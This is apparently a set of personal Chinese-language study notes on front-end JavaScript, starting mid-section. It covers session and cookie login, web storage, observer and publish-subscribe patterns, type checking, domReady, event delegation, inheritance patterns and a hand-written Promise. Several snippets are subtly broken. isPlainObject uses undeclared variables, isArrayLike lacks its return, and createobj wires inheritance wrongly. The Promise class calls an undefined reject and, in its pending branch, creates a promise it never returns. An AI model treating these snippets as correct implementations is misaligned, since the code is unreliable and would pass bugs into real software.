	       都是放在内存的

	     使用 Session 维护用户登录状态的过程如下：
		1. 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；
		2. 服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID；
		3. 服务器返回的响应报文的 Set-Cookie 包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；
		4. 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，
		   继续之前的业务操作
		     * 为减轻 XSS 造成的损失，建议事先在 Cookie 内加上 httponly 属性
		5. 应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。
		     * 经常重新生成 Session ID
		     * Session 管理用户状态 + 对用户进行重新验证 [重新输入密码、使用短信验证码]     

	
      
      2. Storage 接口「同域」
      
         (1) window.sessionStorage/localStorage 
	     部署该接口：“键值对”保存数据
	     
	     => 本质上是对字符串的读取：
	          数组，图片，json，样式，脚本「只要是能序列化成字符串的内容都可以存储」
		  
	     => 同时保存的数据不会再发送给服务器，避免带宽浪费		  
		  
	     1) localStorage：
	        持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的
		
		a. 本质是读取文件，数据较多比较卡
	     
	     2) sessionStorage
	        会话级别的存储 [必须基于会话继承和延续，即只有在当前标签下或当前标签打开的标签下?? 不理解]
	   
	 (2) API
	     
	     * Storage.length：返回保存的数据项个数
	     
	     方法：
	     
	       * Storage.setItem(key, value) -- 保存数据
	       * Storage.getItem(key) -- 读取数据
	       * Storage.removeItem() -- 移除数据
	       * Storage.clear() -- 清除所有 [返回 undefined]
	 
	     事件：
	     
	 	window.addEventListener('storage', onStorageChange);
		
	 (3) 访问的局限性 [同源策略]


      
      

						设计模式
一、观察者模式
    
    1. 什么是观察者模式？
       一个对象（称为subject）维持一系列依赖于它的对象（称为observer），将有关状态的任何变更自动通知给它们（观察者）
          
       Observer模式：
         
	 (1) 必须订阅内容改变的事件，一对多的依赖关系（Subject 一直保持对观察者进行记录。） [耦合高]
	 
	 (2) 被迫执行内容更新事件 [subject 内容事件]
               每一个observer虽然也可以自定义自己的处理程序（update()），但是观察者模式下，观察者们都是做同一类的事情的
	  
	 (3) 大多数时候是同步的
	       
       实现：
       
       	栗子：假设你正在寻找一份前端工程师的职位，对tx很感兴趣，所以你「观察者」联系了HR「目标类」，给了他们你的联系方式，
	HR保证有任何职位空缺的消息都会通知你，这里还有几个候选人和你一样对职位很感兴趣，所以职位空缺大家都会知道「内容更新事件」。
	你回应了他们的通知「对于事件更新自己的处理方式」，可以去参加面试
	
	
			function Dep() { 
			    this.subs = []; // Subject 保持对观察者的记录
			}
			Dep.prototype.addSub = function (sub) { // 添加观察者
			    this.subs.push(sub);
			}
			Dep.prototype.notify = function () { // 定义消息提示
			    this.subs.forEach(sub=>sub.update()); 
			}
			function Watcher(fn) { 
			    this.fn = fn; // 观察者自定义处理程序
			}
			Watcher.prototype.update = function () {
			     this.fn();
			}

			var dep = new Dep(); 
			dep.addSub(new Watcher(function () {
			    console.log('去参加面试');
			}))
			dep.notify();


二、发布订阅模式
    
    1. 什么是发布订阅模式?
       基于一个主题/事件通道，订阅者通过自定义事件订阅主题，发布者通过发布主题事件的方式通知订阅者
       
       // 就一个问题，哪个是发布者类，哪个是订阅者类???
       
       发布订阅模式：
         
	 (1) 基于主题/事件 松散耦合 【发布订阅者不知道对象存在，只有通过消息代理通信】
	 
	 (2) 订阅者可以自定义事件处理程序
	 
	 (3) 多数时候是异步（使用消息队列）
	
	  栗子：
	     监控用户点击document.body的动作，但我们无法预知在什么时候会执行点击
	        
		/*所以我们订阅document.body上的click事件*/
		document.body.addEventListener('click',function () {
	            // code here
		},false);
		
	     
	     实现：
	         
		        function EventTarget() { // 订阅者类
			  this._event = {};
			}
			EventTarget.prototype = {
			  constructor: EventTarget,
			  addHandler: function (event, fn) { // 注册订阅者
			      if (typeof this._event[event] == "undefined") {
				  this._event[event] = [];
			      }
			      this._event[event].push(fn);
			  },
			  fire: function (event) {
			      if (!event.target) {
				  event.target = this;
			      }
			      if (this._event[event.event] instanceof Array) {
				  var _event = this._event[event.event];
				  for (var i = 0, len = _event.length; i < len; i++) {
				      _event[i](event);
				  }
			      }
			  },
			  removeHandler: function (event, fn) {
			      if (this._event[event] instanceof Array) {
				  var _event = this._event[event];
				  for (var i = 0, len = _event.length; i < len; i++) {
				      if (_event[i] === fn) {
					  break;
				      }
				  }
				  _event.splice(i, 1);
			      }
			  }
			};

			var publisher = new EventTarget();  // 订阅者实例
			publisher.addHandler('click',function () {
			  console.log('click');
			});
			//发布者发布消息
			publisher.fire({event: 'click'});  //click
			
			

							补充

一：自执行匿名函数

	(function (x) {})(2) -- 表达式

	function () {}() -- 函数声明

	预编译：此阶段会解释函数声明，忽略表达式
	执行：
	1. 遇到 function () {} 时，在预编译阶段已经被解释过, js 会跳过 function(){} 去执行 (), 故会报错
	2. 当js 执行到 (function {})() 时, 由于(function {})是表达式, js 会去对它求解得到返回值, 由于返回值是一个函数, 故而遇到()时, 便会被	      执行

	函数转为表达式的其他方式：!、~、void
	!function(){}();



							手写代码
							

underscore：debounce、throttle、unique（数组去重）、isElement（是否为DOM元素）、flatten

findIndex、findLastIndex、sortedIndex、indexOf、lastIndexOf、

eq

partial、compose、memorize 共 14 个功能函数

jQuery：type、isArray、isFunction、isPlainObject、isWindow、isArrayLike、extend、each 共 8 个功能函数，

自己实现了 shallowCopy、deepCopy、curry、shuffle 共 4 个功能函数，

十三：类型判断	

  1. typeof  2. constructor  3. instanceof  4. Object.prototype.toString
  对于数组类型，还有 Array.isArray 可以用于判断~
  
  	if (!Array.isArray) {
	  Array.isArray = function(arg) {
	    return Object.prototype.toString.call(arg) === '[object Array]';
	  };
	}
  

类型判断在 web 开发中有非常广泛的应用
  * 简单：判断数字 or 字符串
  * 进阶：判断数组 or 对象
  * 困难：日期、正则、错误类型
  * plainObject、空对象、window

	1. typeof -- 原始类型
	
	
	   原理：typeof 通过判断变量底层低 1~3 位区分
	          因为 null 底层实现用 全0 实现，对象 低 1~3 位也是全 0

	    es6 以前共六种数据类型 | typeof
	    ------------ | -------------
	    Undefined | undefined
	    Null | object
	    Boolean | boolean
	    Number | number
	    String | string
	    Object | object
	    Symbol | symbol/*toString() 无法检测 Symbol*/
	    Function | function/*可以检测出函数，但是还有很多其他的内置类型应该怎么办呢？*/


	2. Object.prototype.toString -- 对象

	      1) this 决定对象 [[class]] 内部属性
	      2) 最后会返回由 "[object " 和 class 和 "]" 三个部分组成的字符串
		  [[class]]: 对象的内部属性

	    (1) type API
		既然有 Object.prototype.toString() 这个神器！那就让我们写个 type 函数帮助我们识别各种类型的值
		可以判断 promise 呐

		  /**
		   * 源码：Jquery 的实现
		   * 小写类型与 [[class]]属性的映射关系
		   */
		  var class2type = {};
		  "Promise Boolean Number String Function Array Date RegExp Object Error Null Undefined"
		  .split(" ").map(function(item, index) {
		      class2type["[object " + item + "]"] = item.toLowerCase();
		  })
		  function type(obj) {
		      return typeof obj === "object" || typeof obj === "function" ?
			  // 未写全映射关系对象识别为 "object"
			  class2type[Object.prototype.toString.call(obj)] || "object" :
			  typeof obj;
		  }


	      (2) plainObject：字面量"{}"、new Object()创建 和 没有原型的对象!
	      
		  主要是为了区分其他 Js 内置对象

		      var class2type = {};

		      var toString = {}.toString,
			  hasOwn = {}.hasOwnProperty;

		      function isPlainObject(obj) {
			  var prototype, Ctor;

			  if (!obj || toString.call(obj) !== "[object Object]")                
			      return false;

			  proto = Object.getPrototypeOf(obj);
			  
			  if (!proto) return true/*没有原型的对象是纯粹的*/
			  
			  Ctor = hasOwn.call(proto, "constructor") && prototype.constructor;
			  
			  /*hasOwn.toString.call() 调用的是 Function.prototype.toString, 也可以实现*/
			  return typeof Ctor === "function" && Ctor instanceof Object
		      }

		(3) 空对象 + window + 数组/类数组

		    a. 空对象

			function isEmptyObject(obj) {
			  for (var key in obj) {
			    if (obj.hasOwnProperty(key)) return false
			  }
			  return true;
			}

		    b. window 对象
		       js中的 '===' 并非对所有引用类型的数据进行判断时都为 false
		       对于那些接近“单例”形式的对象，是可以和自身全等的

			function isWindow(obj) {
			  return obj != null && obj === obj.window/*window.self = window*/
			}

		    c. 数组 / 类数组对象
		       * 数组 √
		       * 长度为 0 arguments √
		       * 若 length 是大于 0 的数字类型，obj[length - 1]必须存在 √

			function isArrayLike( obj ) {
			  var length = obj && 'length' in obj && obj.length
			  var type = type(obj)

			  /*函数和全局变量可能有 length 属性*/
			  if (type === 'function' || isWindow(obj)) return

			  if (type === 'array' || length === 0 || type === 
			  'number' && length > 0 && (length - 1) in obj)
			}

			I. 栗子：长度为0
			  var obj = { a: 1, b: 2, length: 0 }

			II. 重点分析一下 length > 0 且最后一个元素存在

			    数组：当我们在数组中用逗号直接跳过的时候，我们认为该元素是不存在的
			      var arr = [1,,]

			    但是 "类数组对象" 就只能写为：
			      /*符合要求的类数组对象，是一定存在最后一个元素的*/
			      var arrLike = {
				  0: 1,
				  length: 1
			      }

一：domReady 的实现

      1. 什么是 domReady
      
        (1) 如何衡量网页加载速度？
	       
	       * 网络完全加载时间 [window.onload]
	       
	       * no，网络从空白到出现内容加载时间 [DOMContentLoaded]
	           eg: 打开一片 blog，不需要所有图片加载完毕，只需要看到 blog 主内容就可以正常阅读了
	    
	    
        (2) 有内容出现？
	
	       * 浏览器渲染原理
	       
	       * html 要经过浏览器的解析才会变成 dom 节点
	       
	       * 在 dom 树构建完成前操作 dom 会导致错误， dom 树构建完成之后，就叫做 domReady
	 
	 
        (3) why domReady
            我们将 <script> 写在 <body> 之后，浏览器是从上到下，从左向右渲染元素的，这样 Js 一定在 domReady 后执行
	 
	       * 大型项目都是模块化的，js 文件之间都存在依赖
	       
	       * Vue 项目 main.js 中引入了 './config/rem'
	       
	          * webpack 可以将 <script> 注入到 <head>
	          * 没有 domReady 无法实现响应式
	   
	   
        (4) 实现 domReady
	
	       * DOMContentLoaded + 兼容 IE [readystatechange] + 兼容 IE<8 [ html.doScroll() ]
	       
	       * done 状态机 [可用惰性函数]	       
	      
   		demo：
			function domReady(fn) {

			    if (window.addEventListener) {
				window.addEventListener("DOMContentLoaded", fn, false);
			    } else {
				IEContentLoaded(fn);
			    }

			    function IEContentLoaded(fn) {
				var d = window.document;
				var done = false;

				var init = function () { // 只执行一次
				    if (!done) {
					done = true;
					fn();
				    }
				};
				(function () { // 兼容 IE<8, 模拟 onreadystatechange [不支持 readyState]
				    try {
					d.documentElement.doScroll('left');
				    } catch (e) {
					setTimeout(arguments.callee, 50); 
					return;
				    }
				    init();
				})();
				
				//监听document的加载状态
				d.onreadystatechange = function () {
				    if (d.readyState == 'complete') {
					d.onreadystatechange = null; // 防止内存溢出
					init();
				    }
				}
			    }
			}
		
	
二：元素结点操作

      1. 元素结点的判断
	 (1) 实现：
	      !!el && el.nodeType === 1/*不可以那么随意啦..*/
	      
		var a = {            
		   nodeType: 1 => true
		}

	 (2) 实现：
	       
	       a. 对象存在且有 nodeType = 1 的属性
	       b. 对象是 Node 实例
	       c. 可能来自于另外的文档对象，通过 appendChild() 判断
	       
		
		if (obj && obj.nodeType === 1) { /*先过滤最简单的*/
		
		  if (window.Node && (obj instanceof Node)) {
		    return true; /*obj可能是来自另一个文档对象，因此不能轻易返回false*/
		  }
		  try { /*效率很差但可行*/
		    testDiv.appendChild(obj);
		    testDiv.removeChild(obj);
		  } catch (e) {
		    return false;
		  }
		  return true;
		}  
		
      2. 元素结点包含关系：
	        // 事件代理
		while ((b = b.parentNode) && b.nodeName !== ''){
		    if (b === a){  
			return true;  
		    }  
		}
		
      3. 实现 insertAfter
      
		/**
		 * DOM API 实现 insetAfter
		 * 
		 * @param {Node} element 待插入节点
		 * @param {Node} prev 现有节点
		 */
		function insertAfter(element, prev) {
		    const parent = element.parentNode

		    if (parent.lastChild === prev) {
			parent.appendChild(element)
		    } else {
			parent.insertBefore(element, prev.nextSibling)
		    }
		}
		

三：事件代理

      1. li元素结点嵌套（不在最里层），在ul上进行了事件代理
      
           ul->li->div-span结构，如何拿到实际需要触发事件li元素？
      
		    var ul = document.querySelectorAll('ul')[0]
		    ul.addEventListener('click',function(e) {
			var ev = ev || window.event;
			var target = ev.target

			while((target = target.parentNode) && target.nodeName !== 'UL') { /*元素结点的包含关系*/

			   if(target.nodeName.toLocaleLowerCase() == 'li'){
			     // li 的操作
			     break
			   }
			}
		    });
			
			
      2. 事件函数
      
	 ez -- 随便看看就好
	 
	   1. e.stopPropagation：阻止冒泡 
	   
		function stopBubble(e) {
		  if (e && e.stopPropagation) e.stopPropagation() 
		  else window.event.cancelBubble = true // IE
		}
		
	   2. event.preventDefault：阻止默认行为 

		function stopDefault(e) {
		  if (e && e.preventDefault) e.preventDefault() 
		  else window.event.returnValue = false // IE
		}


四：createIterator 与 for...of 实现
      
      1. createIterator
      
	       function createIterator(arr) { /*遍历器本质就是一个指针对象*/
		  var nextIndex = 0; /*指针: 闭包*/
		  
		  /*
		    遍历器本身是线性的
		    指针: 1. let nextIndex = 0, 2. nextIndex++
		   */
		  return {
		    next: function() {
		      return nextIndex < arr.length ?
			{value: arr[nextIndex++], done: false} :
			{value: undefined, done: true};
		    }
		  };
		}
		
		
      2. for..of 简易实现
	        
	1. 是否存在 [Symbol.iterator] 接口
	2. while(!result.done) => 迭代器循环遍历数据结构执行 cb()
	
	   
		function forOf(obj, cb) { /*模拟实现for..of*/
		  let iterable, result;

		  if (typeof obj[Symbol.iterator] !== "function")
		    throw new TypeError(result + " is not iterable");
		  if (typeof cb !== "function") throw new TypeError("cb must be callable");

		  iterable = obj[Symbol.iterator]();

		  result = iterable.next();
		  while (!result.done) {
		    cb(result.value);
		    result = iterable.next();
		  }
		}
	3. 
	


遍历对象的各种方式
	1. for in
	     一个对象自身的、继承的、可枚举的（enumerable: true）、非Symbol的属性
	
	   for (var in object) {
	     /*每次迭代分配不同属性名*/
	   }
	   

	2. Object.keys()「原型链的属性×」
	     可以得到自身可枚举的属性
	   
	   @return [属性名字符串数组]
	   
	3. Object.getOwnPropertyNames()「原型链的属性×」
	     可以得到自身所有的属性(包括不可枚举),Symbols属性也得不到
	   

(3) 创建对象的各种方式

      虽然 Object 构造函数域或对象字面量都可以创建单个对象，但是我们要是创建很多对象的话，会产生大量重复的代码

		1. 工厂模式

			/**
			 * 提供创建对象的方法
			 *
			 * 缺点：对象类型无法识别，因为所有实例都指向一个原型
			 */
			function createPerson(name) {
			  var obj = new Object()
			  obj.name = name
			  obj.getName = function () {
			    console.log(`My name is ${name}`)
			  }
			  return obj
			}
			var person1 = createPerson('kevin');

		         
		2. 构造函数模式
		   与其他函数唯一区别，就在于是否通过 new 调用

			/**
			 * 1. 实例可以识别为一个特定类型，解决了无法识别对象类型问题
			 * 2. 定义自定义类型的属性和方法 [原型继承]
			 * 
			 * 缺点：每次创建实例时，每个方法都要被创建一次 [内存溢出]
			 * 
			 * constructor 最初是用来标识对象类型的，不过 instanceof 更靠谱一些
			 */
			function Person(name) {
			    this.name = name;
			    this.getName = function () {
				console.log(this.name);
			    };
			    /*ECMA 中函数也是对象，每定义一个函数，也就是实例化了一个对象 [function 也是直接量]*/
			    /*this.getName = new Function() {console.log(this.name)} 与声明函数逻辑上是等级的*/
			}
			var person1 = new Person('kevin');

			/**
			 * 构造函数优化：解决了每个方法都要被重新创建的问题
			 * 缺点：这叫啥封装……
			 */
			function Person(name) {
			    this.name = name;
			    this.getName = getName;
			}
			function getName() {
			    console.log(this.name);
			}


		3. 原型模式
		
		   函数的原型也是对象呐   
		     创建自定义构造函数，其原型对象默认只会取得 constructor 属性，其他方法默认都是从 Object 继承而来

		       /**
			* 方法不会重新创建
			* 缺点：1. 所有的属性和方法都共享 [区分与继承引用类属性共享]
			*      2. 不能初始化参数
			*/
			function Person(name) {}
			Person.prototype.name = 'keivn';
			Person.prototype.getName = function () {
			    console.log(this.name);
			};
			/*原型模式优化，封装性好了很多，原型模式的缺点还是有*/
			Person.prototype = {
			    constructor: Person,
			    name: 'kevin',
			    getName: function () {
				console.log(this.name);
			    }
			};
			var person1 = new Person();


		4. 组合模式 [构造函数模式与原型模式双剑合璧]

			/**
			 * 优点：该共享的共享，该私有的私有，使用最广泛的方式
			 * 缺点：有的人就是希望全部都写在一起（所有都封装在构造函数中），即更好的封装性
			 */
			function Person(name) {
			  this.name = name
			}
			Person.prototype = {
			    constructor: Person,
			    getName: function () {
				console.log(this.name);
			    }
			};


		5. 动态原型模式

			/**
			 * 注意：使用动态原型模式时，不能用对象字面量重写原型
			 * new 的实现中，obj._proto_ = Person.prototype 在 Person.apply(obj) 之前执行
			 * 
			 * person1 依然是指向了以前的原型, 而不是 Person.prototype
			 */
			function Person(name) {
			  this.name = name;
			  if (typeof this.getName != "function") {
			      Person.prototype = { /*字面量方式直接覆盖原型*/
				constructor: Person,
				getName: function () {
				    console.log(this.name);
				}
			    }
			  }
			  /*如果你就是想要用字面量方式写代码的话，就再调用一次 new*/
			  /*return new Person(name)*/
			}
			var person1 = new Person('kevin');
			person1.getName(); // 报错


		6. 寄生-构造函数模式
		
			/**
			 * 1. new 模拟实现 [假如构造函数有返回值]
			 * 2. 比工厂模式在创建对象的时候，多使用了一个 new
			 * 
			 * instanceof 都无法指向构造函数...
			 */
			function Person(name) {
			  var o = new Object();
			  o.name = name;
			  o.getName = function () {
			      console.log(this.name);
			  };
			  return o; // 忘了构造函数有返回值的情况...
			}
			var person1 = new Person('kevin');
			
		     栗子：	
			/**
			 * 1. 想创建一个具有额外方法的特殊数组
			 * 2. 不想直接修改Array构造函数
			 * 
			 * 原理：使用工厂模式在实例上添加新方法
			 */
			function SpecialArray() {
			  var values = new Array();

			  for (var i = 0, len = arguments.length; i < len; i++) {
			      values.push(arguments[i]);
			  }

			  values.toPipedString = function () {
			      return this.join("|");
			  };
			  return values;
			}


三、类的创建和继承
	    
      继承的多种实现方式 [继承意味着复制操作]
	  1. 私有变量
	     任何在函数中的变量，都可以认为是私有变量
	     
	       (1) 私有数据和方法
	             通过构造函数封装实现
	       
			/**
			 * 1. getter/setter 作为闭包访问 _name [函数外部无法修改]
			 * 2. 可以隐藏不应该被直接修改的数据
			 */
			function Person() {
			  var _name = 'xy'
			  var _sayHello = function () { }
			  this.getName = function () {
			    return _name
			  }
			  this.setName = function (val) {
			    _name = val
			  }
			}
	     
	
	  2. new 实例继承：为父类实例添加新特性，作为子类实例的返回
	     new 模拟实现：工厂模式
	
	      一个小知识点！构造函数与普通函数没有任何不同，区别在于是否通过 new 调用
	      new Person() // Person()
	  
	  (1) 因为 new 是关键字，所以我们换一种易于理解的方式
		
		var person = new Otaku(……); // 使用 new

		/*一种便于理解的方式*/
		var person = objectFactory(Otaku, ……) // 使用 objectFactory
	  
	  (2) new 的模拟实现
	    1) @return instance
	    2) 继承Otaku.prototype中的属性「这就是继承啦」
 	    3) 访问了构造函数里的属性
	   
		
		function objectFactory() {
		    var obj = new Object(),

		    Constructor = [].shift.call(arguments); // 类数组对象使用数组方法		    
		    // 1.继承原型
		    obj.__proto__ = Constructor.prototype; 
		    /*或者 Object.setPrototypeOf(obj, Constructor.prototype)*/
		    
		    Constructor.apply(obj, arguments); // 2.访问构造函数

		    return obj;
		};
	 
	 
	  以下继承方式与创建对象的多种方式息息相关 
	  3. 原型链继承 
	  
	       原型链继承的实质：扩展了原型链
		 
		   1） 继承意味着复制操作，然而 Js 默认并不会复制对象的属性，相反 Js 只是在两个对象之间创建一个关联，委托的说法更准确一些
		   2） 每一个对象都会从原型‘继承’属性”

	     
	        /**
		 * 创建 Child 的实例时，不能向Parent传参 <= Child.prototype = new Parent()
		 * 缺点：引用类型的属性被所有实例共享
		 */
		function Parent () {
		  this.names = ['kevin', 'daisy'];
		}
		function Child () {}

		Child.prototype = new Parent();

		var child1 = new Child();
		child1.names.push('yayu');// ["kevin", "daisy", "yayu"]

		var child2 = new Child();
		console.log(child2.names); // ["kevin", "daisy", "yayu"]
	 
	 
	     (1) 原型式继承
	         基于已有对象创建新对象，新对象将已有对象作为原型
		 
			Object.create(proto, [propertiesObject])：将传入的对象作为创建对象的原型
			  * proto：指定原型
			  * propertiesObject：属性对象

		      我们只想继承原型，静态属性可能重复继承（1.原型 2.实例）
		      
		      从本质上讲，Object.create() 对传入的对象执行了一次浅 copy

				function createobj (o) {
				  var obj = {}

				  function F () {} /*原型寄生在空函数上，new 的时候砍掉父类实例属性*/
				  F.prototype = o
				  obj.prototype = new F()

				  o.prototype.constructor = obj
				  return obj
				}
	
	
	(2) 借用构造函数「引用类型值的独立」
	    自定义对象类型的属性和方法
	    
		/**
		 * 1. 避免了引用类型的属性被所有实例共享
		 * 2. 可以在 Child 中向 Parent 传参
		 * 
		 * 缺点: 方法都在构造函数中定义，每次创建实例都会创建一遍方法 [每定义一个函数，相当于实例化了一个对象]
		 */
		function Parent () {
		  this.names = ['kevin', 'daisy'];
		}
		function Child () {
		  Parent.call(this);
		}

		var child1 = new Child();
		child1.names.push('yayu');// ["kevin", "daisy", "yayu"]

		var child2 = new Child();
		console.log(child2.names); // ["kevin", "daisy"]
		
	    	原型链的出现就是为了解决这个问题的...
	    
		
	(3) 组合继承：原型链+借用构造函数
	
	   	/**
		 * 缺点: 调用两次构造函数
		 *  1. 设置实例原型（子类型会包含父类所有实例属性）
		 *  2. 创建实例
		 */
		function Parent (name) {
		  this.name = name;
		  this.colors = ['red', 'blue', 'green'];
		}

		Parent.prototype.getName = function () {
		  console.log(this.name)
		}
		function Child (name, age) {
		  Parent.call(this, name);
		  this.age = age;
		}
		Child.prototype = new Parent();

		var child1 = new Child('kevin', '18');/*Parent.call(this, name) 重复调用*/

	
	
	(4) 寄生组合继承「原型式继承」
	    最优雅的继承方式，我们所需要的无非就是父类原型的一个副本而已
	
	    在构造函数继承上加一个Super函数(没有实例和方法) 让他的原型链指向父类的原型链，降低调用父类构造函数开销
			      
		function Child (name, age) {
		  Parent.call(this, name); // 1. 继承
		  this.age = age;
		}

		// 关键的三步 --- Object.create() 化简
		var F = function () {};
		F.prototype = Parent.prototype;
		Child.prototype = new F();
		
		
	(5) es6 class： extends
	    extend的高效率体现在它没有调用superClass构造函数,因此避免了在subClass.prototype上面创建不必要,多余的属性
	   
	    需要会手写 _inherits() 
	     
	            /**
		     * 1. _inherits 继承, 否则子类没有自己 this 对象 [借用构造函数]
		     * 
		     * 2. _possibleConstructorReturn => 使用父类 this 对象
		     *      a. 是否调用 super => (!this)
		     *      b. Person constructor 是否有返回值
		     */ 
		    var Child = function(_Parent) { /*子类没有自己的this对象*/
		      _inherits(Child, _Parent);
		      function _inherits(subClass, superClass) {
			/*
			  原型式继承，使用 Object.create() 且覆写 constructor 属性
			  Child.prototype = Parent.prototype
			 */
			subClass.prototype = Object.create(superClass && superClass.prototype,
				  { constructor: { 
				    value: subClass, 
				    enumerable: false, 
				    writable: true, 
				    configurable: true 
				  } });
			if (superClass)  Object.setPrototypeOf(subClass, superClass) /*Child._proto_ = Parent*/
		      }
			/*Parent.call(this)*/
			 var _this = _possibleConstructorReturn(this, (Object.getPrototypeOf(Child)).call(this, name))
			_this.age = age

			return _this
		    }


实现一个 promise： 

传统的异步编程：1. 回调函数 2. 事件监听 3. 发布订阅
	
		  
	   (1) resolve()「reject」: 改变 promise 状态为成功「失败」
	      
	       * 可以同步或异步执行
	       * 对象状态只会改变一次（只有 pending 状态才会进行状态改变操作）
	     
	   (2) .then：属于微任务哈!
	     
	       a. 模拟事件队列 
	            promise 的 .then 和 .catch 可以被调用多次
		   
	       b. onFulfilled 不能被同步调用，且返回值为promise对象 [链式调用]
	       
	       c. Promise 神奇的值的穿透也没有那么黑魔法，只不过是then默认参数就是把值往后传或者抛
	       
	        	  /**
			   * 只需要设置 .then 默认参数即可：
			   *    1. onRs = typeof onRs === 'function' ? onRs : value => {return value}
			   *    2. onRj = typeof onRj === 'function' ? onRj : reason => {throw reason}
			   */
			  new Promise(resolve => resolve(8))
			  .then(function(value){
			    return value
			  })
			  .then(value => {
			    alert(value)
			  })
	     
	     
	     栗子：executor 执行函数
	     
	     		const promise = new Promise((resolve, reject) => {
			  // ... some async code
			  if (/* 异步操作成功 */){
			    resolve(value);
			  }
			});
			
	       d. 将 resolve 写在构造函数外？
	          resolve.bind 执行后，相当于每个 promise 对象都有自己的一对 reject、resolve 函数，与写在构造函数内部没有区别...
		  
			// bind 用于改变 this 指向，而此时 this 刚好指向 promise 实例	
			function resolve() {}
			function reject() {}
			function Promise(executor) {
			  try {
			    executor(resolve.bind(this), reject.bind(this))
			  } catch(e) {
			    reject.bind(this)(e)
			  }
			}
			
	     实现：
			/**
			 * 1. resolve, reject 可以不定义在构造函数中吗？
			 *    resolve(value) 而不是 resolve.call(promise, value) 调用, 实现中赋值给 this.value [this 一定指向
			 *    promise 实例]
			 * 
			 * 2. 需要考虑隐藏 this 上的变量，promise 状态只能在executor函数内改变 [setter]
			 *    -> ez: 再包裹一层 构造函数
			 * 
			 * 3. 规范里没有规定一个异步操作的结果时另一个异步操作的情况
			 * 
			 */
			class Promise {
			  constructor(executor) {
			    this.state = 'pending';
			    this.value = undefined;
			    this.reason = undefined;
			    this.onResolvedCallbacks = [];/*promise 对象可以有多个 .then、.catch*/

			    let resolve = value => {
			      if (this.state === 'pending') {
				this.state = 'fulfilled';
				this.value = value;
				this.onResolvedCallbacks.forEach(fn => fn());
			      }
			    };
			    try {
			      executor(resolve, reject);
			    } catch (err) {
			      reject(err);
			    }
			  }
			  then(onFulfilled, onRejected) {
			    const promise2 = new Promise((resolve, reject) => {
			      if (this.state === 'fulfilled') {
				setTimeout(() => { /*即使resolve顺序执行，.then实现也是异步执行微任务*/
				  try {
				    let x = onFulfilled(this.value);
				    resolvePromise(promise2, x, resolve, reject);
				  } catch (e) {
				    reject(e);
				  }
				}, 0);
			      };
			      if (this.state === 'pending') {
							const promise2 = new Promise((resolve, reject) => {
				  this.onResolvedCallbacks.push(() => {
				    setTimeout(() => {
				      try {
					let x = onFulfilled(this.value);
					resolvePromise(promise2, x, resolve, reject);
				      } catch (e) {
					reject(e);
				      }
				    }, 0);
				  });
				})
			      };
			    });
			    return promise2;
			  }
			}


		      
		 3) 链式调用 [封装 x -> promise对象]
		    onFulfilled / onRejected，即 then 返回结果，称为 x		    
		    
		      I. x == promise [this.value = x]
		      
		      (1) 为什么我们要在实现中返回一个 new Promise()?
		          状态只能改变一次呐
		      
		      标准中说：如果 promise1.then(onRs, onRj)里的 onRs/onRj 返回一个 Promise，则 promise2 直接取这个 Promise 
			       的状态和值为己用 [这个说法是有矛盾的] [目前的实现也都返回了 promise]
			 
				/**
				 * Promise/A+标准 .then 并没有要求返回一个新的对象 -> promise2 === promise1
				 * 
				 * 1. 如果 foo 运行了，promise1 的状态必然已经确定, 没办法再取 Promise.reject(3) 的状态和结果为己用
				 * 2. then 可以多次调用, 而且每次返回值都与传入状态有关 [this 状态确定不能再改变]
				 *
				 *  => 需要返回 新promise 对象
				 */
				promise1.then(foo(value) => {
				  return Promise.reject(3) // 返回了 this
				})
			 
		      II. x 直接作为 promise2 异步的结果 [this.value = x]
		     
		     
		     a. 循环引用：
		     
		        var p2 = p.then(data => {			  
			  return p2;/*自己等待自己完成*/
			})

		      
	(1) 为什么需要 resolvePromise？
	    实现链式调用与不同 promise 实现之间的交互

	(2) resolvePromise 区分 x 值为 promise、thenable、原始值三种情况
	      promise: 
		2.1 pending 
		2.2 状态已改变: 取它的结果作为 promise2 异步的结果

		    /**
		     * (1) 实现不同的 promise 能够相互交互
		     *    1. 因为 promise 一开始并不是 Js 标准，不同第三方实现也是互不知晓的
		     *    2. 标准详细指定了如何通过 .then 的实参返回的值 决定 promise2 的状态
		     * 
		     * @param {链式调用 新promise} promise2
		     * @param {异步的结果} resolve
		     * 
		     * (2) 尽可能正确处理 x（thenable 对象）, 实现了一个 .then 但并不遵循 promise 规范的对象
		     *    1. x 调用了 then 两个参数
		     *    2. 同步调用 .then 方法
		     *    3. 出错后继续调用 
		     * 
		     * (3) 
		     *   a. x.status === 'pending'
		     *   如果 x 是一个 Promise，并且状态还处于 pending，那么先 then 拿到最终的 value，接下来才 resolve value
		     *    
		     *   resolve() 的实现：
		     *   if (value instanceof Promise) {
		     *      return value.then(resolve, reject)
		     *   }
		     *   
		     *   b. else
		     *   处理这样的情况, 状态已经改变的 promise：
		     *    
		     *	  // onRs 返回 fulfilled 状态的 promise
		     *	  // 其实就是在返回的过程中已经调用了 resolvePromise 函数
		     *    x.then(p2 => {
		     *      return new Promise(...)
		     *    })
		     */
		    function resolvePromise(promise2, x, resolve, reject) {
		      if (x === promise2) {
			return reject();/*循环引用报错*/
		      }
		      if (x instanceof Promise) {
			if (x.status === 'pending') {
			  x.then(value => { 
			    //because x could resolved by a Promise Object
			    resolvePromise(promise2, value, resolve, reject) 
			  }, reject)
			} else {
			  //but if it is resolved, it will never resolved by a Promise Object but a static value
			  x.then(resolve, reject) 
			}
			return
		      }
		      //尽可能正确处理 x
		      let thenCalledOrThrow;
		      if (x != null && (typeof x === 'object' || typeof x === 'function')) {
			try {
			  let then = x.then; //because x.then could be a getter

			  if (typeof then === 'function') {/*thenable 对象*/

			    then.call(x, y => {
			      if (thenCalledOrThrow) return;

			      thenCalledOrThrow = true;
			      resolvePromise(promise2, y, resolve, reject);
			    }, err => {
			      if (thenCalledOrThrow) return;

			      thenCalledOrThrow = true;
			      reject(err);
			    })

			  } else {
			    resolve(x);
			  }
			} catch (e) {
			  if (thenCalledOrThrow) return;
			  thenCalledOrThrow = true;
			  reject(e);
			}
		      } else {
			resolve(x);
		      }
		    }

	 
		    
